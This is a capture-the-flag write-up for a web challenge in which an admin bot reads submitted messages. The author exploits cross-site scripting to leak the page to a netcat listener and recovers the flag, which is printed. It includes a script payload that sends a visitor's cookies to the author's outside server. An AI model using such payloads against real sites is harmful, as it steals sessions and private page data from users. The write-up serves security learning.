...
The third web challenge.

That was a ___really cool___ challenge.

The challenge prompt notes that you can submit things to the admin and he always reads the messages. Typically, that is the cookbook formula for an [XSS][XSS] ([cross-site scripting][cross-site scripting]) [cookie catcher] attack. 

I tried that attack with my domain [johnhammond.org], but didn't get any results. I thought it must not have been anything to do with the [cookies]. 

Then, I re-read the challenge prompt. "My boss has created a website"... and I wonder, _what is on that website?_

___We could totally leak out the whole page with [JavaScript]!___

With this attack, though, it differs from the [cookie catcher] tactic because I'm not trying to redirect or hijack the web browser with [XSS]... but I need to deliberately _send_ something, or make a request. We can still do this with [JavaScript].

[I did a little bit of research](https://www.kirupa.com/html5/making_http_requests_js.htm) and quickly grabbed the syntax for how to make a request in [JavaScript]:
...
I could set up a listener on an external server (my [johnhammond.org] domain or whatever) and then have it just waiting to receive some data. It would work like my [cookie catcher], (waiting on an [HTTP GET] variable), but instead of receiving [cookies] I could snag the contents of the webpage. That means my actually [XSS] payload would be, rather than...

``` html
<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org/?cookie=" + document.cookie, true); xhr.send(); </script>
```
...
I tried this payload (with a proper listener in PHP), but didn't get any results from the actual [CTF] challenge. I thought that was odd, since this seemed sound, so I tried it with a local testbed. _That_ worked. 

After thinking for a while, I realized maybe the data that was exfiltrating was too big or something. So I tried a different kind of listener.

Rather than doing it with a web listener and page, I tried a simple [`netcat`][netcat] solution.

On my server, I spun up a listener with whatever port:
...
I use [`tee`][tee] to see the output and save it a file simultaneously. Then I changed my payload to send it to the port:
...
On my listener I saw the whole page flash by. There were some [base64] encoded images and things, but those weren't important.

First I get rid of the [URL][URL] [percent encoding][percent encoding], which I did simply with [Python]:
...
Now we can run through that file:

```
cat data.txt | grep -oE "BITSCTF{(.*)}"
```

And our flag was just hiding in there, amongst the [base64] encoded images.
...
__The flag was: `BITSCTF{hsr_1s_n0t_cr3ative}`__
